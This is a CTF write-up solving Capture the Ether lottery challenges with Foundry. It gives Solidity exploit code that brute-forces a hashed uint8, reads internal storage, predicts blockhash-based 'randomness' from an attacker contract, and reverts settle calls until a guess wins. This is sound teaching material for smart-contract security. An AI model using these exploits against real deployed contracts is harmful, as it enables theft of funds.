# Capture the Ether Solutions

Solutions to the [Capture The Ether](https://capturetheether.com/challenges/) CTF challenges using Foundry ⛳️

## Disclaimer

Most of the contracts were rewritten slightly so they still compile with newer solidity versions. Comments were added for those parts.

## Contents

-   [Lotteries](#lotteries)
    -   [Guess the number](#guess-the-number)
    -   [Guess the secret number](#guess-the-secret-number)
    -   [Guess the random number](#guess-the-random-number)
    -   [Guess the new number](#guess-the-new-number)
    -   [Predict the future](#predict-the-future)

## Lotteries

### Guess the number

Call the `guess` function with the `answer` number `42` which is hardcoded in the contract

```solidity
challenge.guess{value: 1 ether}(42);
```

[Test](./test/lotteries/TestGuessTheNumberChallenge.t.sol)

### Guess the secret number

The answer `n` is now a number that produces a specific `answerHash` which is not reversible

```solidity
function guess(uint8 n) public payable {
        require(msg.value == 1 ether);

        // if (keccak256(n) == answerHash) {
        //     msg.sender.transfer(2 ether);
        // }

        if (keccak256(abi.encodePacked(n)) == answerHash) {
            payable(msg.sender).transfer(2 ether);
        }
    }
```

The answer `n` is defined as a `uint8`, which ranges from 0 to 255. We can brute force the answer via a for-loop until we get the specific hash.

```solidity
for (uint8 i = 0; i <= type(uint8).max; i++) {
            bytes32 currentHash = keccak256(abi.encodePacked(i));

            if (currentHash == answerHash) {
                // log result
                console.log("Correct answer: ", i);

                // call contract
                vm.prank(user);
                challenge.guess{value: 1 ether}(i);
            }
        }
```

[Test](./test/lotteries/TestGuessTheSecretNumberChallenge.t.sol)

### Guess the random number

In this case the answer is generated "randomly" and stored "internally" in the contract (default visibility of state variables is `internal`):

```solidity
constructor() payable {
        require(msg.value == 1 ether);
        answer = uint8(
            uint256(
                keccak256(
                    abi.encodePacked(
                        blockhash(block.number - 1),
                        block.timestamp
                    )
                )
            )
        );
    }
```

Data in smart contracts can be read despite being declared as "internal" because in the end all data on the blockchain is public. The key here is to understand how the storage works, and that the `answer` is stored in `slot 0` and therefore can be retrieved by calling:

```solidity
uint8 answer = uint8(uint256(vm.load(address(challenge), 0)));
```

[Test](./test/lotteries/TestGuessTheRandomNumberChallenge.t.sol)

### Guess the new number

The answer is a "random" number generated inside the function call:

```solidity
function guess(uint8 n) public payable {
        require(msg.value == 1 ether);

        uint8 answer = uint8(
            uint256(
                keccak256(
                    abi.encodePacked(
                        blockhash(block.number - 1),
                        block.timestamp
                    )
                )
            )
        );

        if (n == answer) {
            payable(msg.sender).transfer(2 ether);
        }
    }
```

This answer isn't actually random though. The EVM is deterministic, so it is not possible to achieve randomness inside it. Given the same inputs, it will output the same result, and we can exploit this.
We can create a new contract that calculates the answer and calls the original contract with it. That way we can make sure that the "random" number is generated on the same block, and we can win every time.

```solidity
        uint8 answer = uint8(
            uint256(
                keccak256(
                    abi.encodePacked(
                        blockhash(block.number - 1),
                        block.timestamp
                    )
                )
            )
        );

        i_challenge.guess{value: 1 ether}(answer);
```

This only works if you let the attacker contract receive Ether:

```solidity
receive() external payable {}
```

And don't forget to transfer the Ether from the attacker contract to your address (or create a withdraw function only callable by you) 💸

[Test](./test/lotteries/TestGuessTheNewNumberChallenge.t.sol)

### Predict the future

The guess answer now has to be set beforehand, and then settled on a new tx, as it requires to be on a future block

```solidity
function lockInGuess(uint8 n) public payable {
  guess = n;
  settlementBlockNumber = block.number + 1;
}

function settle() public {
  require(block.number > settlementBlockNumber);
  uint8 answer = uint8(
            uint256(
                keccak256(
                    abi.encodePacked(
                        blockhash(block.number - 1),
                        block.timestamp
                    )
                )
            )
        ) % 10;
}
```

The "random" answer can _only_ be a number between `0-9` because of the `% 10`.

With this in mind we can exploit it:

1. Create an attacker contract and call `lockInGuess()` with any number between `0-9` through the contract

```solidity
function lockNumber(uint8 _number) public payable {
        require(msg.value == 1 ether);
        require(
            _number >= 0 && _number <= 9,
            "Number must be in the 0-9 range"
        );

        challenge.lockInGuess{value: 1 ether}(_number);
    }
```

2. Wait 2 blocks
3. Call `settle()` through the attacker contract and revert in case challenge wasn't solved

```solidity
function solveChallenge() public {
        challenge.settle();
        // Reverts in case guess != answer
        require(challenge.isComplete(), "Try again");
        (bool success, ) = owner.call{value: address(this).balance}("");
        require(success, "sending eth to owner failed");
    }
```

Call `solveChallenge` in concecutive blocks until solved. This way we only pay when we know we will win.

[Test](./test/lotteries/TestPredictTheFutureChallenge.t.sol)
